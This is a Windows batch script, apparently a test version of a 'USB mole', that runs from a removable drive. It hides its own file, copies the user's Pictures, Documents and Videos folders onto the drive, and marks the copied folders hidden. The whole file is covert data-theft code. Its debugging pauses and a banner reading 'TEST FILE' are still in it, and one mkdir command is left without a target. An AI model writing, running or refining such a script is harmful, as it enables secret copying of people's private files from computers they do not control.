@ECHO off
color 0c


:: Vars
Set CURRENT_DIR=%CD%
Set FILE_DIR_PATH=%~f0
Set BASE_DIR=%CURRENT_DIR:~0,13%
Set IMAGE_DIR=%BASE_DIR%\Pictures
Set DOCS_DIR=%BASE_DIR%\Documents
Set VIDS_DIR=%BASE_DIR%\Videos
:: Start
	Echo %IMAGE_DIR%
	Echo [TEST FILE - PAULO USB MOLE - CAUTION] 
	pause

:: Set Myself invisi if not already
ATTRIB +h "%FILE_DIR_PATH%"

:: Folder Validation and Creation (AND)
:: Copying functions, fix to also get in folder files, not 1st tier only!
	:: Making files invisible after
	if EXIST "%IMAGE_DIR%" (
		 if not exist "%CURRENT_DIR%\Images" mkdir "%CURRENT_DIR%\Images" 
			for %%f in ( %IMAGE_DIR%\*.* ) do (
				xcopy /s %%f "%CURRENT_DIR%\Images"
			)
			ATTRIB +h "%CURRENT_DIR%\Images" 
	 )
	
	if EXIST "%DOCS_DIR%" ( 
		 if not exist "%CURRENT_DIR%\Docs" mkdir "%CURRENT_DIR%\Docs" 
		 	for %%f in ( %DOCS_DIR%\*.* ) do (
				xcopy /s %%f "%CURRENT_DIR%\Docs"
			)
			ATTRIB +h "%CURRENT_DIR%\Docs"
	)

	if EXIST "%VIDS_DIR%" ( 
		 if not exist "%CURRENT_DIR%\Videos" mkdir 
		 	for %%f in ( %VIDS_DIR%\*.* ) do (
				xcopy /s %%f "%CURRENT_DIR%\Videos"
			)
			ATTRIB +h "%CURRENT_DIR%\Videos" 
	)


pause

